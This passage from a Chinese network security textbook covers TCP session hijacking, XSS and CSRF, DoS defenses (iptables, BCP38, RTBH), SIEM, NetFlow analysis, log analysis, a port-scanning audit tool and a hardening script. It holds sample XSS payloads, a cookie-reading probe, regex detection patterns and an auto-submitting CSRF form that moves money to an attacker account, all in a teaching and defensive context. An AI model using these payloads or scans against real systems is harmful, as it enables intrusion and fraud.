1. 嗅探目标会话，获取：
   - 源/目的 IP 和端口
   - 当前 TCP 序列号

2. 预测下一个序列号

3. 注入伪造的数据包
   - 使用正确的序列号和确认号
   - 目标主机会接受这些数据

4. 原始会话的一方会收到"意外"数据
   导致连接不同步

防御措施：
- 使用 TLS/SSL 加密
- 使用随机化的 TCP 初始序列号
- 实施 IPSec
```

---

## 26.5 Web 安全（网络视角）

### 26.5.1 跨站脚本攻击（XSS）

XSS 攻击通过在网页中注入恶意脚本来攻击用户。

```python
"""
XSS 攻击向量示例（仅用于安全测试和教学）
"""

# 反射型 XSS 向量
xss_vectors = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '"><script>alert(document.cookie)</script>',
    "javascript:alert('XSS')",
    '<body onload=alert("XSS")>',
    '<iframe src="javascript:alert(\'XSS\')">',
    '<input onfocus=alert("XSS") autofocus>',
    '<details open ontoggle=alert("XSS")>',
    '<marquee onstart=alert("XSS")>',
]

# XSS 检测函数
def detect_xss(user_input):
    """检测输入中的潜在 XSS 向量"""
    import re

    patterns = [
        r'<script[^>]*>',
        r'javascript:',
        r'on\w+\s*=',
        r'<iframe',
        r'<object',
        r'<embed',
        r'<img[^>]+onerror',
        r'<svg[^>]+onload',
        r'document\.cookie',
        r'document\.write',
        r'eval\s*\(',
        r'alert\s*\(',
    ]

    for pattern in patterns:
        if re.search(pattern, user_input, re.IGNORECASE):
            return True, pattern
    return False, None

# 测试
for vector in xss_vectors:
    detected, pattern = detect_xss(vector)
    status = "BLOCKED" if detected else "MISSED"
    print(f"[{status}] {vector[:50]}... (pattern: {pattern})")
```

### 26.5.2 CSRF 攻击

跨站请求伪造（CSRF）利用用户已认证的会话，诱使用户执行非预期操作。

```python
"""
CSRF 攻击原理与防御示例
"""

# CSRF 攻击示例（HTML 表单自动提交）
csrf_attack_html = """
<!-- 攻击者页面中嵌入的隐藏表单 -->
<html>
<body onload="document.getElementById('csrf-form').submit()">
  <form id="csrf-form" action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker_account"/>
    <input type="hidden" name="amount" value="10000"/>
    <input type="hidden" name="currency" value="CNY"/>
  </form>
</body>
</html>
"""

# CSRF 防御：生成和验证 CSRF Token
import secrets
import hmac
import hashlib
import time

class CSRFProtection:
    """CSRF Token 保护机制"""

    def __init__(self, secret_key):
        self.secret_key = secret_key
        self.tokens = {}  # token -> (timestamp, session_id)

    def generate_token(self, session_id):
        """为会话生成 CSRF Token"""
        # 生成随机 token
        token = secrets.token_hex(32)

        # 使用 HMAC 绑定到会话
        mac = hmac.new(
            self.secret_key.encode(),
            f"{token}:{session_id}".encode(),
            hashlib.sha256
        ).hexdigest()

        self.tokens[token] = (time.time(), session_id, mac)
        return token

    def validate_token(self, token, session_id, max_age=3600):
        """验证 CSRF Token"""
        if token not in self.tokens:
            return False

        stored_time, stored_session, stored_mac = self.tokens[token]

        # 检查是否过期
        if time.time() - stored_time > max_age:
            del self.tokens[token]
            return False

        # 检查会话匹配
        if stored_session != session_id:
            return False

        # 验证 HMAC
        expected_mac = hmac.new(
            self.secret_key.encode(),
            f"{token}:{session_id}".encode(),
            hashlib.sha256
        ).hexdigest()

        if not hmac.compare_digest(stored_mac, expected_mac):
            return False

        # 使用后删除（一次性 token）
        del self.tokens[token]
        return True

# 使用示例
csrf = CSRFProtection("my-secret-key-12345")
token = csrf.generate_token("user-session-abc")
print(f"Generated CSRF Token: {token[:32]}...")

# 验证
is_valid = csrf.validate_token(token, "user-session-abc")
print(f"Token valid: {is_valid}")
```

---

## 26.6 防御策略

### 26.6.1 速率限制

速率限制（Rate Limiting）是防御 DoS 攻击的基础手段。

```bash
# iptables 速率限制示例

# 限制每个源 IP 的新 TCP 连接速率
# 最多每秒 25 个新连接，突发 50 个
sudo iptables -A INPUT -p tcp --syn -m limit \
  --limit 25/second --limit-burst 50 -j ACCEPT

# 超过速率的包丢弃
sudo iptables -A INPUT -p tcp --syn -j DROP

# 限制 ICMP 速率（防 Ping Flood）
sudo iptables -A INPUT -p icmp --icmp-type echo-request \
  -m limit --limit 1/second --limit-burst 4 -j ACCEPT
sudo iptables -A INPUT -p icmp --icmp-type echo-request -j DROP

# 限制特定端口的连接速率（防 SSH 暴力破解）
sudo iptables -A INPUT -p tcp --dport 22 -m state --state NEW \
  -m recent --set --name SSH
sudo iptables -A INPUT -p tcp --dport 22 -m state --state NEW \
  -m recent --update --seconds 60 --hitcount 4 --name SSH -j DROP

# 使用 hashlimit 模块（更灵活）
sudo iptables -A INPUT -p tcp --dport 80 -m hashlimit \
  --hashlimit-name http \
  --hashlimit-mode srcip \
  --hashlimit-above 100/sec \
  --hashlimit-burst 150 \
  --hashlimit-htable-expire 30000 \
  -j DROP

# nftables 速率限制（更现代的方式）
sudo nft add rule inet filter input tcp flags syn \
  meter syn-rate { ip saddr limit rate 25/second burst 50 packets } accept

sudo nft add rule inet filter input tcp flags syn drop
```

### 26.6.2 BCP38 罀络入口过滤

BCP38（Best Current Practice 38）是 RFC 2827 定义的网络入口过滤规范，防止 IP 地址欺骗。

```
BCP38 原理：

ISP 在网络入口处过滤掉源 IP 不属于该网段的数据包

示例：
  客户网段: 192.168.1.0/24
  
  入口过滤规则：
  - 允许源 IP 在 192.168.1.0/24 范围内的包
  - 丢弃源 IP 不在该范围内的包
  
  效果：
  - 客户无法发送伪造源 IP 的数据包
  - 从源头阻止反射攻击
```

```bash
# 在路由器/防火墙上实施 BCP38

# Cisco 路由器配置（uRPF）
interface GigabitEthernet0/0
  ip address 192.168.1.1 255.255.255.0
  ip verify unicast source reachable-via rx

# Linux iptables 入口过滤
# 丢弃来自外部接口但源 IP 是私有地址的包
sudo iptables -A INPUT -i eth0 -s 10.0.0.0/8 -j DROP
sudo iptables -A INPUT -i eth0 -s 172.16.0.0/12 -j DROP
sudo iptables -A INPUT -i eth0 -s 192.168.0.0/16 -j DROP

# 丢弃来自外部接口但源 IP 是本机地址的包
sudo iptables -A INPUT -i eth0 -s 127.0.0.0/8 -j DROP

# 出口过滤：确保发出的包源 IP 是本网络的
sudo iptables -A OUTPUT -o eth0 ! -s 203.0.113.0/24 -j DROP
```

### 26.6.3 RTBH（Remote Triggered Black Hole）

RTBH 是一种基于 BGP 的流量黑洞技术，用于在网络边缘丢弃攻击流量。

```
RTBH 工作原理：

1. 检测到 DDoS 攻击目标 IP: 192.168.1.100

2. 管理员在触发路由器上配置静态路由：
   ip route 192.168.1.100/32 Null0 tag 66

3. 通过 BGP 将该路由通告给上游路由器
   设置 community: 65000:666 (黑洞标记)

4. 上游路由器收到路由后：
   - 将目标 IP 的所有流量导向 Null0（丢弃）
   - 攻击流量在网络边缘被丢弃

5. 攻击结束后，删除静态路由，恢复正常

类型：
- 目标黑洞：丢弃到特定 IP 的所有流量
- 源黑洞：丢弃来自特定源 IP 的流量（需要源验证）
```

```bash
# RTBH 配置示例（BIRD 路由软件）

# /etc/bird/bird.conf
router id 203.0.113.1;

# 定义黑洞过滤器
filter rtbh_filter {
    if (net = 192.168.1.100/32) then {
        # 设置黑洞 community
        bgp_community.add((65000, 666));
        accept;
    }
    reject;
}

# 上游 BGP 邻居
protocol bgp upstream {
    local as 65001;
    neighbor 203.0.113.254 as 65000;
    export filter rtbh_filter;
}

# 静态黑洞路由（触发用）
protocol static blackhole {
    route 192.168.1.100/32 unreachable;
}
```

### 26.6.4 流量清洗中心

流量清洗中心（Scrubbing Center）是专业的 DDoS 防御设施。

```
流量清洗架构：

          ┌─────────────┐
  Internet│             │
    ──────┤  边缘路由器  │
          │             │
          └──────┬──────┘
                 │
          ┌──────┴──────┐
          │  流量分析器  │ 检测异常流量
          │ (NetFlow/    │
          │  sFlow)      │
          └──────┬──────┘
                 │ 异常流量
          ┌──────┴──────┐
          │  清洗中心    │
          │ (Scrubbing   │ 1. 协议合规性检查
          │  Center)     │ 2. 速率限制
          │              │ 3. 行为分析
          │              │ 4. 指纹过滤
          └──────┬──────┘
                 │ 清洁流量
          ┌──────┴──────┐
          │  目标服务器  │
          └─────────────┘

清洗策略：
1. 协议合规性检查：丢弃畸形数据包
2. 源验证：SYN Cookie、uRPF
3. 速率限制：基于源 IP/端口的限速
4. 行为分析：机器学习识别异常模式
5. 指纹过滤：匹配已知攻击特征
```

---

## 26.7 安全监控

### 26.7.1 SIEM（安全信息与事件管理）

SIEM 系统集中收集、分析和关联安全事件。

```
SIEM 架构：

数据源：
├── 网络设备日志（路由器、交换机、防火墙）
├── 服务器日志（系统日志、应用日志）
├── IDS/IPS 告警
├── NetFlow/sFlow 数据
├── 终端安全日志
└── 用户行为日志

SIEM 功能：
├── 日志聚合：集中存储所有日志
├── 事件关联：发现多源事件的关联
├── 实时告警：基于规则的告警引擎
├── 合规报告：生成安全合规报告
└── 事件响应：自动化响应工作流

典型规则示例：
1. 同一源 IP 5 分钟内登录失败 > 10 次 → 暴力破解告警
2. 非工作时间访问敏感服务器 → 异常访问告警
3. 单主机大量 DNS 查询 → 可能的 DNS 隧道告警
4. 内网主机连接已知 C2 服务器 → 恶意软件告警
```

### 26.7.2 NetFlow/sFlow 流量分析

<div data-component="NetFlowCollector"></div>

NetFlow 和 sFlow 是网络流量监控的两种主要技术。

```
NetFlow vs sFlow：

NetFlow:
- Cisco 开发的流统计技术
- 采样并记录每个流的信息
- 流 = 五元组 (src_ip, dst_ip, src_port, dst_port, protocol)
- 版本：v5（常用）、v9（灵活）、IPFIX（标准）

sFlow:
- 标准化的采样技术（RFC 3176）
- 随机采样数据包（通常 1:1000 或 1:2048）
- 包含数据包头部和部分负载
- 可以分析到应用层

采集器架构：
  路由器/交换机 → UDP → NetFlow/sFlow 采集器 → 数据库 → 可视化
  (导出器)            (2055端口)    (分析处理)      (存储)    (展示)
```

```python
#!/usr/bin/env python3
"""
NetFlow v5 数据包解析器
NetFlow v5 是最常用的 NetFlow 版本
"""
import struct
import socket
from datetime import datetime

class NetFlowV5Parser:
    """NetFlow v5 数据包解析器"""

    # NetFlow v5 报文头格式
    HEADER_FORMAT = '!HHIIIIBBH'
    HEADER_SIZE = 24

    # NetFlow v5 流记录格式
    RECORD_FORMAT = '!IIIHHIIIIHHBBBBHHBBH'
    RECORD_SIZE = 48

    PROTOCOL_MAP = {
        1: "ICMP", 6: "TCP", 17: "UDP",
        47: "GRE", 50: "ESP", 51: "AH", 58: "ICMPv6"
    }

    def __init__(self):
        self.flows = []

    def parse_header(self, data):
        """解析 NetFlow v5 报文头"""
        if len(data) < self.HEADER_SIZE:
            return None

        (version, count, sys_uptime, unix_secs,
         unix_nsecs, flow_sequence, engine_type,
         engine_id, sampling_interval) = struct.unpack(
            self.HEADER_FORMAT, data[:self.HEADER_SIZE]
        )

        if version != 5:
            return None

        return {
            "version": version,
            "count": count,
            "sys_uptime_ms": sys_uptime,
            "unix_secs": unix_secs,
            "unix_nsecs": unix_nsecs,
            "flow_sequence": flow_sequence,
            "engine_type": engine_type,
            "engine_id": engine_id,
            "sampling_interval": sampling_interval & 0x3FFF,
            "sampling_mode": (sampling_interval >> 14) & 0x3
        }

    def parse_record(self, data):
        """解析单条流记录"""
        if len(data) < self.RECORD_SIZE:
            return None

        (src_addr, dst_addr, nexthop, input_iface,
         output_iface, packet_count, octet_count,
         first_time, last_time, src_port, dst_port,
         pad1, tcp_flags, protocol, tos, src_as,
         dst_as, src_mask, dst_mask, pad2) = struct.unpack(
            self.RECORD_FORMAT, data[:self.RECORD_SIZE]
        )

        flow_duration = last_time - first_time

        return {
            "src_ip": socket.inet_ntoa(struct.pack('!I', src_addr)),
            "dst_ip": socket.inet_ntoa(struct.pack('!I', dst_addr)),
            "next_hop": socket.inet_ntoa(struct.pack('!I', nexthop)),
            "input_iface": input_iface,
            "output_iface": output_iface,
            "packets": packet_count,
            "octets": octet_count,
            "first_time_ms": first_time,
            "last_time_ms": last_time,
            "duration_ms": flow_duration,
            "src_port": src_port,
            "dst_port": dst_port,
            "tcp_flags": self.parse_tcp_flags(tcp_flags),
            "protocol": self.PROTOCOL_MAP.get(protocol, str(protocol)),
            "protocol_num": protocol,
            "tos": tos,
            "src_as": src_as,
            "dst_as": dst_as,
            "src_mask": src_mask,
            "dst_mask": dst_mask
        }

    @staticmethod
    def parse_tcp_flags(flags):
        """解析 TCP 标志位"""
        flag_list = []
        if flags & 0x01: flag_list.append("FIN")
        if flags & 0x02: flag_list.append("SYN")
        if flags & 0x04: flag_list.append("RST")
        if flags & 0x08: flag_list.append("PSH")
        if flags & 0x10: flag_list.append("ACK")
        if flags & 0x20: flag_list.append("URG")
        return ",".join(flag_list) if flag_list else "NONE"

    def parse_packet(self, data):
        """解析完整的 NetFlow v5 数据包"""
        header = self.parse_header(data)
        if header is None:
            return None

        flows = []
        offset = self.HEADER_SIZE

        for i in range(header["count"]):
            record = self.parse_record(data[offset:])
            if record:
                record["flow_set_id"] = i
                record["header_info"] = {
                    "unix_secs": header["unix_secs"],
                    "flow_sequence": header["flow_sequence"],
                    "uptime_ms": header["sys_uptime_ms"]
                }
                flows.append(record)
            offset += self.RECORD_SIZE

        return {
            "header": header,
            "flows": flows
        }


class NetFlowAnalyzer:
    """NetFlow 流量分析器"""

    def __init__(self):
        self.parser = NetFlowV5Parser()
        self.flow_db = []
        self.stats = {
            "total_flows": 0,
            "total_packets": 0,
            "total_octets": 0,
            "protocol_dist": {},
            "top_talkers": {},
            "port_scan_candidates": set()
        }

    def process_flow(self, flow):
        """处理单条流记录"""
        self.flow_db.append(flow)
        self.stats["total_flows"] += 1
        self.stats["total_packets"] += flow["packets"]
        self.stats["total_octets"] += flow["octets"]

        # 协议分布统计
        proto = flow["protocol"]
        self.stats["protocol_dist"][proto] = \
            self.stats["protocol_dist"].get(proto, 0) + 1

        # Top Talkers 统计
        src = flow["src_ip"]
        self.stats["top_talkers"][src] = \
            self.stats["top_talkers"].get(src, 0) + flow["octets"]

    def detect_anomalies(self):
        """检测流量异常"""
        alerts = []

        # 检测端口扫描：同一源 IP 短时间访问大量不同端口
        src_ports = {}
        for flow in self.flow_db:
            src_ip = flow["src_ip"]
            if src_ip not in src_ports:
                src_ports[src_ip] = set()
            src_ports[src_ip].add(flow["dst_port"])

        for src_ip, ports in src_ports.items():
            if len(ports) > 100:
                alerts.append({
                    "type": "PORT_SCAN",
                    "src_ip": src_ip,
                    "ports_scanned": len(ports),
                    "severity": "HIGH"
                })

        # 检测异常大的流量
        avg_octets = self.stats["total_octets"] / max(
            self.stats["total_flows"], 1)
        for flow in self.flow_db:
            if flow["octets"] > avg_octets * 100:
                alerts.append({
                    "type": "LARGE_FLOW",
                    "src_ip": flow["src_ip"],
                    "dst_ip": flow["dst_ip"],
                    "octets": flow["octets"],
                    "severity": "MEDIUM"
                })

        # 检测 SYN Flood 模式
        syn_count = {}
        for flow in self.flow_db:
            if "SYN" in flow["tcp_flags"] and "ACK" not in flow["tcp_flags"]:
                key = flow["dst_ip"]
                syn_count[key] = syn_count.get(key, 0) + flow["packets"]

        for dst_ip, count in syn_count.items():
            if count > 1000:
                alerts.append({
                    "type": "SYN_FLOOD",
                    "dst_ip": dst_ip,
                    "syn_count": count,
                    "severity": "CRITICAL"
                })

        return alerts

    def start_udp_listener(self, port=2055):
        """启动 UDP 监听器接收 NetFlow 数据"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(('0.0.0.0', port))

        print(f"[*] NetFlow collector listening on UDP port {port}")

        try:
            while True:
                data, addr = sock.recvfrom(65535)
                result = self.parser.parse_packet(data)

                if result:
                    for flow in result["flows"]:
                        self.process_flow(flow)

                    print(f"[*] Received {len(result['flows'])} flows "
                          f"from {addr[0]}")

                    # 定期检测异常
                    if self.stats["total_flows"] % 100 == 0:
                        alerts = self.detect_anomalies()
                        for alert in alerts:
                            print(f"  [!] ALERT: {alert}")

        except KeyboardInterrupt:
            print(f"\n[*] Total flows: {self.stats['total_flows']}")
            print(f"[*] Total bytes: {self.stats['total_octets']}")
            print(f"[*] Protocol distribution: "
                  f"{self.stats['protocol_dist']}")

            # 打印 Top 10 Talkers
            sorted_talkers = sorted(
                self.stats["top_talkers"].items(),
                key=lambda x: x[1], reverse=True
            )[:10]
            print("[*] Top 10 Talkers:")
            for ip, bytes_count in sorted_talkers:
                print(f"    {ip}: {bytes_count:,} bytes")
        finally:
            sock.close()


if __name__ == "__main__":
    analyzer = NetFlowAnalyzer()
    analyzer.start_udp_listener(port=2055)
```

### 26.7.3 流量分析引擎的 NetFlow/sFlow 采集器架构

<div data-component="TrafficAnalysisEngine"></div>

```
采集器架构设计：

┌─────────────────────────────────────────────────────┐
│                  数据采集层                           │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐          │
│  │ NetFlow  │  │  sFlow   │  │  Packet  │          │
│  │ Exporter │  │  Agent   │  │  Mirror  │          │
│  │ (UDP:2055)│ │ (UDP:6343)│ │  (SPAN)  │          │
│  └─────┬────┘  └─────┬────┘  └─────┬────┘          │
│        │             │             │                │
└────────┼─────────────┼─────────────┼────────────────┘
         │             │             │
┌────────┼─────────────┼─────────────┼────────────────┐
│        ▼             ▼             ▼                │
│  ┌─────────────────────────────────────┐            │
│  │         解析与标准化引擎              │            │
│  │  - NetFlow v5/v9/IPFIX 解析         │            │
│  │  - sFlow 解析                        │            │
│  │  - PCAP 解析                         │            │
│  │  - 统一数据模型转换                   │            │
│  └──────────────────┬──────────────────┘            │
│                     │                               │
│  ┌──────────────────▼──────────────────┐            │
│  │         流量分析引擎                  │            │
│  │  - 流量聚合与统计                     │            │
│  │  - 异常检测算法                       │            │
│  │  - 协议分析                           │            │
│  │  - 地理位置查询                       │            │
│  └──────────────────┬──────────────────┘            │
│                     │                               │
│  ┌──────────────────▼──────────────────┐            │
│  │         存储与可视化层                │            │
│  │  - Elasticsearch (日志存储)           │            │
│  │  - InfluxDB (时序数据)               │            │
│  │  - Grafana (仪表板)                  │            │
│  │  - Kibana (日志分析)                 │            │
│  └─────────────────────────────────────┘            │
└─────────────────────────────────────────────────────┘
```

### 26.7.4 日志分析

```python
"""
安全日志分析示例
使用正则表达式和统计方法分析常见安全日志
"""
import re
from collections import Counter, defaultdict
from datetime import datetime, timedelta

class SecurityLogAnalyzer:
    """安全日志分析器"""

    # 常见日志模式
    PATTERNS = {
        "ssh_failed": re.compile(
            r'(\w+\s+\d+\s+\d+:\d+:\d+)\s+(\S+)\s+sshd\[\d+\]: '
            r'Failed password for .* from (\S+)'
        ),
        "ssh_success": re.compile(
            r'(\w+\s+\d+\s+\d+:\d+:\d+)\s+(\S+)\s+sshd\[\d+\]: '
            r'Accepted password for (\S+) from (\S+)'
        ),
        "web_404": re.compile(
            r'(\S+)\s+-\s+\S+\s+\[([^\]]+)\]\s+"(\S+\s+\S+\s+\S+)"\s+404'
        ),
        "firewall_drop": re.compile(
            r'(\w+\s+\d+\s+\d+:\d+:\d+)\s+(\S+)\s+kernel: '
            r'\[.*\]\s+IN=(\S+)\s+OUT=\s+SRC=(\S+)\s+DST=(\S+)\s+'
            r'PROTO=(\S+)\s+SPT=(\d+)\s+DPT=(\d+)'
        ),
    }

    def __init__(self):
        self.events = []
        self.stats = {
            "ssh_failed": Counter(),
            "ssh_success": Counter(),
            "web_attacks": Counter(),
            "firewall_drops": Counter(),
        }
        self.alerts = []

    def parse_line(self, line):
        """解析单行日志"""
        # SSH 登录失败
        m = self.PATTERNS["ssh_failed"].search(line)
        if m:
            timestamp, host, src_ip = m.groups()
            self.events.append({
                "type": "ssh_failed",
                "timestamp": timestamp,
                "host": host,
                "src_ip": src_ip
            })
            self.stats["ssh_failed"][src_ip] += 1
            return

        # SSH 登录成功
        m = self.PATTERNS["ssh_success"].search(line)
        if m:
            timestamp, host, user, src_ip = m.groups()
            self.events.append({
                "type": "ssh_success",
                "timestamp": timestamp,
                "host": host,
                "user": user,
                "src_ip": src_ip
            })
            self.stats["ssh_success"][src_ip] += 1
            return

        # 防火墙丢弃
        m = self.PATTERNS["firewall_drop"].search(line)
        if m:
            (timestamp, host, interface, src_ip, dst_ip,
             protocol, src_port, dst_port) = m.groups()
            self.events.append({
                "type": "firewall_drop",
                "timestamp": timestamp,
                "host": host,
                "interface": interface,
                "src_ip": src_ip,
                "dst_ip": dst_ip,
                "protocol": protocol,
                "src_port": src_port,
                "dst_port": dst_port
            })
            self.stats["firewall_drops"][src_ip] += 1

    def analyze(self, window_minutes=5, failed_threshold=10):
        """分析日志并生成告警"""
        # SSH 暴力破解检测
        for src_ip, count in self.stats["ssh_failed"].items():
            if count >= failed_threshold:
                success = self.stats["ssh_success"].get(src_ip, 0)
                self.alerts.append({
                    "type": "BRUTE_FORCE",
                    "severity": "HIGH",
                    "src_ip": src_ip,
                    "failed_attempts": count,
                    "successful_logins": success,
                    "detail": f"SSH brute force from {src_ip}: "
                              f"{count} failed attempts"
                })

        # 检测成功的登录来自暴力破解 IP
        for src_ip in self.stats["ssh_failed"]:
            if self.stats["ssh_success"].get(src_ip, 0) > 0:
                self.alerts.append({
                    "type": "SUCCESSFUL_BRUTE_FORCE",
                    "severity": "CRITICAL",
                    "src_ip": src_ip,
                    "detail": f"Successful login from brute-force IP {src_ip}"
                })

        # 防火墙丢弃 Top 10
        top_drops = self.stats["firewall_drops"].most_common(10)

        return {
            "total_events": len(self.events),
            "alerts": self.alerts,
            "ssh_failed_top5": self.stats["ssh_failed"].most_common(5),
            "firewall_drops_top10": top_drops
        }

    def generate_report(self):
        """生成分析报告"""
        results = self.analyze()

        report = []
        report.append("=" * 60)
        report.append("SECURITY LOG ANALYSIS REPORT")
        report.append("=" * 60)
        report.append(f"\nTotal events parsed: {results['total_events']}")

        report.append(f"\n--- Alerts ({len(results['alerts'])}) ---")
        for alert in results["alerts"]:
            report.append(f"  [{alert['severity']}] {alert['detail']}")

        report.append("\n--- Top 5 SSH Failed Sources ---")
        for ip, count in results["ssh_failed_top5"]:
            report.append(f"  {ip}: {count} attempts")

        report.append("\n--- Top 10 Firewall Drop Sources ---")
        for ip, count in results["firewall_drops_top10"]:
            report.append(f"  {ip}: {count} packets")

        return "\n".join(report)


# 使用示例
analyzer = SecurityLogAnalyzer()

# 模拟日志数据
sample_logs = [
    "Jun 10 08:15:22 server1 sshd[1234]: Failed password for root from 10.0.0.5",
    "Jun 10 08:15:23 server1 sshd[1235]: Failed password for admin from 10.0.0.5",
    "Jun 10 08:15:25 server1 sshd[1236]: Failed password for root from 10.0.0.5",
    "Jun 10 08:16:01 server1 sshd[1240]: Accepted password for root from 10.0.0.5",
    "Jun 10 08:20:00 server1 kernel: [12345] IN=eth0 OUT= SRC=192.168.1.100 DST=10.0.0.1 PROTO=TCP SPT=45678 DPT=22",
]

for log in sample_logs:
    analyzer.parse_line(log)

print(analyzer.generate_report())
```

---

## 26.8 综合实验

### 26.8.1 网络安全审计脚本

```python
#!/usr/bin/env python3
"""
综合网络安全审计工具
结合端口扫描、服务检测、安全评估
"""
import socket
import ssl
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

class SecurityAuditor:
    """网络安全审计工具"""

    VULNERABLE_SERVICES = {
        21: {"service": "FTP", "risk": "HIGH",
             "note": "明文传输，易被嗅探"},
        23: {"service": "Telnet", "risk": "CRITICAL",
             "note": "明文传输，极不安全"},
        25: {"service": "SMTP", "risk": "MEDIUM",
             "note": "可能被用于垃圾邮件中继"},
        80: {"service": "HTTP", "risk": "MEDIUM",
             "note": "明文传输，检查 TLS 配置"},
        110: {"service": "POP3", "risk": "HIGH",
             "note": "明文传输"},
        143: {"service": "IMAP", "risk": "HIGH",
             "note": "明文传输"},
        443: {"service": "HTTPS", "risk": "LOW",
             "note": "检查 TLS 版本和证书"},
        3306: {"service": "MySQL", "risk": "HIGH",
               "note": "数据库端口不应对外暴露"},
        3389: {"service": "RDP", "risk": "HIGH",
               "note": "远程桌面，暴力破解风险"},
        5432: {"service": "PostgreSQL", "risk": "HIGH",
               "note": "数据库端口不应对外暴露"},
        6379: {"service": "Redis", "risk": "CRITICAL",
               "note": "默认无认证，可远程执行命令"},
        27017: {"service": "MongoDB", "risk": "CRITICAL",
                "note": "默认无认证，数据泄露风险"},
    }

    def __init__(self, target, timeout=3):
        self.target = target
        self.timeout = timeout
        self.findings = []

    def check_port(self, port):
        """检查端口状态并获取 banner"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.target, port))

            if result == 0:
                banner = ""
                try:
                    sock.settimeout(2)
                    banner = sock.recv(1024).decode(
                        'utf-8', errors='ignore').strip()
                except Exception:
                    pass

                sock.close()
                return (port, "open", banner)
            else:
                sock.close()
                return (port, "closed", "")

        except Exception:
            return (port, "error", "")

    def check_tls(self, port=443):
        """检查 TLS 配置"""
        try:
            context = ssl.create_default_context()
            with socket.create_connection(
                (self.target, port), timeout=self.timeout
            ) as sock:
                with context.wrap_socket(
                    sock, server_hostname=self.target
                ) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    version = ssock.version()

                    return {
                        "status": "OK",
                        "tls_version": version,
                        "cipher": cipher[0],
                        "cert_subject": dict(x[0] for x in cert["subject"]),
                        "cert_issuer": dict(x[0] for x in cert["issuer"]),
                        "cert_expires": cert["notAfter"]
                    }
        except Exception as e:
            return {"status": "ERROR", "error": str(e)}

    def audit(self, ports=None):
        """执行安全审计"""
        if ports is None:
            ports = list(self.VULNERABLE_SERVICES.keys())

        print(f"[*] Security Audit: {self.target}")
        print(f"[*] Started: {datetime.now()}")
        print("-" * 60)

        # 端口扫描
        open_ports = []
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {
                executor.submit(self.check_port, port): port
                for port in ports
            }
            for future in as_completed(futures):
                port, status, banner = future.result()
                if status == "open":
                    open_ports.append(port)
                    service_info = self.VULNERABLE_SERVICES.get(
                        port, {"service": "Unknown", "risk": "INFO", "note": ""}
                    )

                    finding = {
                        "port": port,
                        "service": service_info["service"],
                        "risk": service_info["risk"],
                        "note": service_info["note"],
                        "banner": banner
                    }
                    self.findings.append(finding)

                    print(f"  [OPEN] {port}/tcp - {service_info['service']}")
                    if banner:
                        print(f"         Banner: {banner[:80]}")
                    print(f"         Risk: {service_info['risk']}")
                    print(f"         Note: {service_info['note']}")

        # TLS 检查
        if 443 in open_ports:
            print(f"\n--- TLS Configuration ---")
            tls_info = self.check_tls(443)
            if tls_info["status"] == "OK":
                print(f"  TLS Version: {tls_info['tls_version']}")
                print(f"  Cipher: {tls_info['cipher']}")
                print(f"  Expires: {tls_info['cert_expires']}")

                if tls_info["tls_version"] in ("TLSv1", "TLSv1.1"):
                    self.findings.append({
                        "port": 443,
                        "service": "HTTPS",
                        "risk": "HIGH",
                        "note": f"Outdated TLS: {tls_info['tls_version']}"
                    })

        # 生成报告
        print(f"\n{'='*60}")
        print(f"AUDIT SUMMARY")
        print(f"{'='*60}")
        print(f"Open ports: {len(open_ports)}")

        critical = [f for f in self.findings if f["risk"] == "CRITICAL"]
        high = [f for f in self.findings if f["risk"] == "HIGH"]
        medium = [f for f in self.findings if f["risk"] == "MEDIUM"]

        print(f"Critical findings: {len(critical)}")
        print(f"High findings: {len(high)}")
        print(f"Medium findings: {len(medium)}")

        if critical:
            print(f"\n[!] CRITICAL ISSUES:")
            for f in critical:
                print(f"    Port {f['port']}: {f['note']}")

        return self.findings


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 auditor.py <target>")
        sys.exit(1)

    auditor = SecurityAuditor(sys.argv[1])
    auditor.audit()
```

### 26.8.2 iptables 安全加固脚本

```bash
#!/bin/bash
# server_hardening.sh - Linux 服务器网络安全加固脚本

set -e

echo "[*] Starting server hardening..."

# 1. 清除现有规则
iptables -F
iptables -X
iptables -t nat -F
iptables -t mangle -F

# 2. 默认策略：拒绝所有入站，允许所有出站
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# 3. 允许回环接口
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

# 4. 允许已建立的连接
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# 5. 防 SYN Flood
iptables -A INPUT -p tcp --syn -m limit \
  --limit 25/second --limit-burst 50 -j ACCEPT
iptables -A INPUT -p tcp --syn -j DROP

# 6. 防 ICMP Flood
iptables -A INPUT -p icmp --icmp-type echo-request \
  -m limit --limit 1/second --limit-burst 4 -j ACCEPT
iptables -A INPUT -p icmp --icmp-type echo-request -j DROP

# 7. 防端口扫描
iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP
iptables -A INPUT -p tcp --tcp-flags ALL ALL -j DROP
iptables -A INPUT -p tcp --tcp-flags ALL FIN,URG,PSH -j DROP
iptables -A INPUT -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG -j DROP
iptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP
iptables -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP

# 8. 允许 SSH（限制速率）
iptables -A INPUT -p tcp --dport 22 -m state --state NEW \
  -m recent --set --name SSH
iptables -A INPUT -p tcp --dport 22 -m state --state NEW \
  -m recent --update --seconds 60 --hitcount 4 --name SSH -j DROP
iptables -A INPUT -p tcp --dport 22 -m state --state NEW -j ACCEPT

# 9. 允许 HTTP/HTTPS
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# 10. BCP38 入口过滤
iptables -A INPUT -i eth0 -s 10.0.0.0/8 -j DROP
iptables -A INPUT -i eth0 -s 172.16.0.0/12 -j DROP
iptables -A INPUT -i eth0 -s 192.168.0.0/16 -j DROP
